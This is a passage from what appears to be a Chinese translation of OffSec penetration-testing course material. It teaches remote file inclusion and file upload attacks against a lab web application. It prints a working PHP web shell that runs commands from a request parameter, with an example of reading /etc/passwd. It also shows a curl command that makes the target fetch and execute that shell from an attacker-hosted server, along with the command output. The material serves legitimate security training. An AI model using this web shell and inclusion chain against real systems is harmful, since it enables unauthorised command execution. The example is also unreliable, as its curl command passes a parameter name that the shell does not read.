
列表 152 显示我们成功通过 base64 编码的 PHP 代码段实现了代码执行。这是一个可以帮助我们绕过基础过滤的方便技巧。然而，我们需要意识到 `data` 包装器在默认 PHP 安装中无法工作。要利用它，需要启用 `allow_url_include`。

## 9.2.3 远程文件注入 (RFI)

远程文件注入 (RFI) 漏洞不如 LFI 常见，因为目标系统必须经过特定配置。例如，在 PHP 应用程序中，需要启用 `allow_url_include` 选项来利用 RFI，就像上一节中的 `data` 包装器一样。如所述，它在所有 PHP 版本中默认都是禁用的。启用此选项的常见场景是 Web 应用程序从远程系统加载内容（例如库或数据）。我们可以使用目录遍历和 LFI 章节中涵盖的技巧发现 RFI 漏洞

Kali Linux 在 `/usr/share/webshells/php/` 目录下包含了多个可用于 RFI 的 PHP shell。Web shell 是一个提供类似于命令行界面的小型脚本，使得执行命令变得更加快捷方便。在示例中，我们使用 `simple-backdoor.php` shell 来利用“Mountain Desserts”Web 应用程序中的 RFI 漏洞。

首先，让我们查看 `simple-backdoor.php` shell 的内容。我们将使用它来测试之前节中 LFI 漏洞的 RFI。代码与之前节中使用的 PHP 代码段非常相似。它接受 `cmd` 参数中的命令并通过 `system` 函数执行它们。

```
kali@kali:/usr/share/webshells/php$ cat simple-backdoor.php
...
```

```php
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
}
?>
```

用法：`http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd`

列表 153 - `simple-backdoor.php` shell 的位置和内容

为了利用 RFI（远程文件包含）漏洞，我们需要让目标系统能够访问远程文件。可以使用 Python3 的 `http.server` 模块在我们的 Kali 机器上启动 Web 服务器，并为目标系统提供我们需要的文件。`http.server` 模块将 Web 目录设置为终端的当前目录。

我们也可以使用公开访问的文件，例如来自 Github 的文件。

```
kali@kali:~/usr/share/webshells/php$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) / ...
```

列表 154 - 启动 Python3 `http.server` 模块

当 Web 服务器以 `/usr/share/webshells/php/` 为当前目录运行时后，我们已经在攻击机上完成了所有必要步骤。接下来，我们将使用 `curl` 通过 HTTP 包含该文件并将其指定为我们的命令。

```
kali@kali:~/usr/share/webshells/php$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php?phpcmd=ls"
```

```
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) ---->
```

```
<pre>admin.php
bavarian.php
css
fonts
img
index.php
js
</pre>
```

列表 155 - 使用 PHP 后门利用 RFI 并执行命令

列表 155 显示，我们通过包含一个远程托管的 webshell 成功利用了 RFI 漏洞。在 LFI（本地文件包含）部分，我们可以使用 Netcat 创建反向 shell 并在目标系统上获取交互式 shell。

# 9.3 文件上传漏洞

本单元涵盖了以下学习目标：

- 理解文件上传漏洞
- 学习如何识别文件上传漏洞
- 探索利用文件上传漏洞的不同向量

> 422 (Python Documentation, 2022), https://docs.python.org/3/

> 423 (Python Documentation, 2022), https://docs.python.org/3/library/http.server.html

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec

许多应用程序都提供上传文件的功能。在本学习单元中，我们将学习如何识别、利用和利用文件上传漏洞来访问底层系统或执行代码。通常情况下，我们可以将文件上传漏洞分为三类：

第一类漏洞允许我们上传可以被 Web 应用程序执行的文件。例如，如果我们可以将 PHP 脚本上传到启用了 PHP 的 Web 服务器，我们就可以通过浏览器或 `curl` 访问它来执行该脚本。正如我们在文件包含单元中观察到的，通过 PHP，我们也可以在其他框架或服务器端脚本语言中利用这种漏洞。

第二类漏洞需要我们将文件上传机制与另一种机制结合，例如目录遍历。例如，如果 Web 应用程序受到目录遍历漏洞的影响，我们可以在文件上传请求中使用相对路径来覆盖 `authorized_keys`。此外，我们还可以将文件上传机制与 XML 外部实体（XXE）或跨站脚本（XSS）攻击结合。例如，当我们被允许向带有 SVG 文件类型的个人资料上传头像时，我们可能会嵌入 SVG 攻击来显示文件内容或执行代码。

第三类漏洞依赖于用户交互。例如，当我们为职位申请设计上传表单时，可以尝试上传一个带有恶意宏的 `.docx` 文件。由于此类漏洞需要人员访问我们上传的文件，我们将在本学习单元中关注另外两类文件上传漏洞。

## 9.3.1 使用可执行文件

在本节中，我们将回顾一种允许我们上传文件并由 Web 服务器运行的文件上传漏洞。与目录遍历和文件包含漏洞一样，我们应该理解如何识别文件上传漏洞。

根据 Web 应用程序及其用途，我们可以做出明智的推断来定位上传机制。如果 Web 应用程序是内容管理系统（CMS），我们通常可以为个人资料上传头像，或创建带有附件文件的博客文章和页面。如果我们的目标是公司网站，我们通常可以在职业板块或特定的公司用例中找到上传机制。例如，如果目标网站属于一家律师事务所，可能有一个用于案件文件的上传机制。有时，文件上传机制对用户来说并不明显，因此在处理 Web 应用程序时，我们绝不能跳过枚举阶段。

在这个示例中，我们将滥用文件上传机制来实现代码执行并获取反向 shell。让我们回顾 MOUNTAIN VM 上的 "Mountain Desserts" Web 应用程序。打开 Firefox 并导航到 `http://192.168.50.189/meteor/`。

> 424 (OWASP, 2022), https://www.owasp.org/www-community/vulnerabilities/XML_External_Entity_Processing 

> 425 (OWASP, 2022), https://www.owasp.org/www-community/vulnerabilities/xss/

> 426 (Mozilla Developer Network, 2022), https://developer.mozilla.org/en-US/SVG

> 427 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/openspec/file-standards/doc

> 428 (Microsoft Support, 2022), https://support.microsoft.com/en-us/office/in-files

> 429 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Content_management_system

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec

使用 Kali Linux 进行渗透测试

`img/336d6ea891e746f18ad6442619ced_0.png`

图 13: 更新后的 "Mountain Desserts" Web 应用程序
